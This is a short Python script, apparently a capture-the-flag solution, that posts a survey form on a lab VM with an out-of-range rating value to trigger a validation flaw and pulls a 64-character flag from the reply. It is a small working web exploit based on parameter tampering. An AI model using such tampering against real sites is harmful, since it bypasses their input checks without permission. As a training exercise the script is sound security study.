import os
import re
import requests

VM_IP = os.environ.get("VM_IP", "192.168.122.118")
url = f"http://{VM_IP}/?page=survey"

r = requests.post(url, data={"sujet": "3", "valeur": 11})
match = re.search(r"flag is ([a-f0-9]{64})", r.text, re.IGNORECASE)
if match:
    print(f"Flag: {match.group(1)}")
else:
    print("Flag not found in response")
